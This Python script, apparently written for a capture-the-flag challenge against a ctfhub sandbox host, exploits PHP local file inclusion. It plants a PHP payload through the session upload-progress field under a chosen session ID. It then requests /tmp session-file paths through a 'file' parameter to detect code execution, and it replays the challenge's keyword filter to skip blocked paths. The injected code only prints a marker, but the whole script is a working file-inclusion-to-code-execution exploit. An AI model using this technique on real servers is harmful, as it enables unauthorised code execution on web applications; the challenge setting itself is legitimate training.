#!/usr/bin/env python3
"""Debug session file inclusion."""
import requests
import re

target = 'http://challenge-c295913eebc950ce.sandbox.ctfhub.com:10800'

# Baseline
r_base = requests.get(f'{target}/')
base_text = re.sub(r'<[^>]+>', '', r_base.text)
base_len = len(r_base.text)
print(f'Baseline: {base_len} bytes')

# Try different temp paths
session_paths = [
    '/tmp/sess_aaa',
    '/tmp/sess_bbb',
    '/var/tmp/sess_aaa',
    '/tmp/php/sess_aaa',
]

# First, send upload to create session file
payload = '<?php echo "FLAGMARKER"; ?>'
files = {'file': ('test.txt', b'x' * 5000, 'text/plain')}
data = {'PHP_SESSION_UPLOAD_PROGRESS': payload}
resp = requests.post(
    f'{target}/',
    files=files,
    data=data,
    cookies={'PHPSESSID': 'aaa'},
    timeout=15
)
print(f'Upload response: {len(resp.text)} bytes')

# Now test each path
for sp in session_paths:
    if len(sp) > 15:
        print(f'SKIP {sp}: >15 chars ({len(sp)})')
        continue
    # Check filter
    banned = ["while", "for", "\$_", "include", "env", "require", "?", ":", "^", "+", "-", "%", "*", "`"]
    blocked = False
    for b in banned:
        if b in sp:
            print(f'SKIP {sp}: contains "{b}"')
            blocked = True
            break
    if blocked:
        continue

    try:
        r = requests.get(f'{target}/', params={'file': sp}, timeout=10)
        diff = len(r.text) - base_len
        if diff > 0:
            print(f'{sp}: {len(r.text)} bytes (diff: +{diff})')
        elif diff < 0:
            print(f'{sp}: {len(r.text)} bytes (diff: {diff})')
        else:
            print(f'{sp}: same as baseline')

        if diff > 0:
            # Show the extra content
            if 'FLAGMARKER' in r.text:
                print(f'  >>> CODE EXECUTED!')
            # Show what's different
            extra = r.text[base_len:base_len+500]
            print(f'  Extra: {extra[:300]}')
    except Exception as e:
        print(f'{sp}: ERROR - {e}')
